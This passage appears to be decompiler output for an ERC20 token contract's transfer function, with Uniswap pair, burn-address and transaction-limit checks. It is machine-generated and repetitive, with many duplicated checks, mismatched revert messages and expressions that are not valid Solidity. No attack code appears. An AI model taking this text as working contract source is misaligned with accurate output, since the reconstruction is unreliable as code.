/ store_h)) > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(uniPairAddy) == (address(this)), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * (arg1 / store_h)) / store_h)) > _maxxTransferSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * (arg1 / store_h)) / store_h)) > _maxxTrxSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == 0xdead), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] - (store_i * ((store_i * (arg1 / store_h)) / store_h)) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = storage_map_b[var_a] - (store_i * ((store_i * (arg1 / store_h)) / store_h));\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0xdead;\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_i * ((store_i * (arg1 / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0xdead;\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_j == ((store_j * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_j * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = (store_j * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) + storage_map_b[var_a];\n        var_c = store_j * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h);\n        emit Transfer(address(this), address(this), store_j * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h));\n        require(!(store_i > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > store_i), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_i == ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(uniPairAddy) == (address(this)), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) > _maxxTransferSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) > _maxxTrxSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == 0xdead), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] - (store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = storage_map_b[var_a] - (store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h));\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0xdead;\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0xdead;\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_j == ((store_j * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_j * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = (store_j * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a];\n        var_c = store_j * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h);\n        emit Transfer(address(this), address(this), store_j * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h));\n        require(!(store_i > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > store_i), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_i == ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(uniPairAddy) == (address(this)), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTransferSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTrxSize), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(uniPairAddy) == 0xdead), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x17;\n        require(!(!bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_f)), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] - (store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = storage_map_b[var_a] - (store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h));\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0xdead;\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0xdead;\n        var_b = 0x17;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_j == ((store_j * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!(storage_map_b[var_a] > ((store_j * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x18;\n        storage_map_b[var_a] = (store_j * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a];\n        var_c = store_j * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h);\n        emit Transfer(address(this), address(this), store_j * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h));\n        require(!(store_i > 0), \"ERC20: transfer to the zero address\");\n        require(0xdead - (address(uniPairAddy)), \"ERC20: transfer to the zero address\");\n        require(!(store_j > store_i), \"ERC20: transfer to the zero address\");\n        require(store_h, \"ERC20: transfer to the zero address\");\n        require((store_i == ((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) / ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h))) | (!(store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x18;\n        require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x17;\n        if (storage_map_b[var_a]) {\n            if (storage_map_b[var_a]) {\n                var_a = address(this);\n                var_b = 0x17;\n                if (storage_map_b[var_a]) {\n                    if (storage_map_b[var_a]) {\n                        if (storage_map_b[var_a]) {\n                            if (storage_map_b[var_a]) {\n                                if (address(uniPairAddy) == (address(this))) {\n                                    if (!(store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTransferSize) {\n                                        var_a = address(this);\n                                        var_b = 0x17;\n                                        if (storage_map_b[var_a]) {\n                                            if (storage_map_b[var_a]) {\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                var_a = address(this);\n                                                var_b = 0x17;\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                var_a = address(this);\n                                                var_b = 0x17;\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                var_a = address(this);\n                                                var_b = 0x18;\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                require(address(uniPairAddy) == (address(this)), \"TX Limit Exceeded\");\n                                                require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTransferSize), \"TX Limit Exceeded\");\n                                                require(bytes1(storage_map_b[var_a]), \"TX Limit Exceeded\");\n                                                require(bytes1(storage_map_b[var_a]), \"TX Limit Exceeded\");\n                                                require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTrxSize), \"TX Limit Exceeded\");\n                                                require(bytes1(storage_map_b[var_a]), \"TX Limit Exceeded\");\n                                                require(bytes1(storage_map_b[var_a]), \"TX Limit Exceeded\");\n                                                var_a = address(this);\n                                                var_b = 0x18;\n                                                require(!(!bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_h = 0x11;\n                                                var_a = address(this);\n                                                var_b = 0x18;\n                                                storage_map_b[var_a] = storage_map_b[var_a] - (store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h));\n                                                var_b = 0x17;\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                var_a = 0xdead;\n                                                var_b = 0x18;\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_h = 0x11;\n                                                var_a = 0xdead;\n                                                var_b = 0x17;\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                                require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                            }\n                                            store_f = 0x01 | (uint248(store_f));\n                                            require(!(!bytes1(store_f)), \"TX Limit Exceeded\");\n                                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_h = 0x11;\n                                            require(!(storage_map_b[var_a] - (store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > storage_map_b[var_a]), \"TX Limit Exceeded\");\n                                            require(!(bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                            require(!(storage_map_b[var_a] > ((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) + storage_map_b[var_a])), \"TX Limit Exceeded\");\n                                        }\n                                    }\n                                }\n                            }\n                            require(!(bytes1(storage_map_b[var_a])), \"TX Limit Exceeded\");\n                            require(0xdead - (address(uniPairAddy)), \"TX Limit Exceeded\");\n                            require(!(store_j > 0), \"TX Limit Exceeded\");\n                        }\n                    }\n                }\n                require(0xdead - (address(uniPairAddy)), \"TX Limit Exceeded\");\n            }\n            require(!(store_k > (0x01 + store_k)), \"TX Limit Exceeded\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTrxSize), \"TX Limit Exceeded\");\n        require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTrxSize), \"TX Limit Exceeded\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTransferSize), \"TX Limit Exceeded\");\n        require(!((store_i * ((store_i * ((store_i * ((store_i * ((store_i * (arg1 / store_h)) / store_h)) / store_h)) / store_h)) / store_h)) > _maxxTransferSize), \"TX Limit Exceeded\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        if (0xdead == 0xdead) {\n        }\n        require(bytes1(uniPairAddy / 0x010000000000000000000000000000000000000000), \"enabledTrading\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0e;\n        var_f = 0x656e61626c656454726164696e67000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 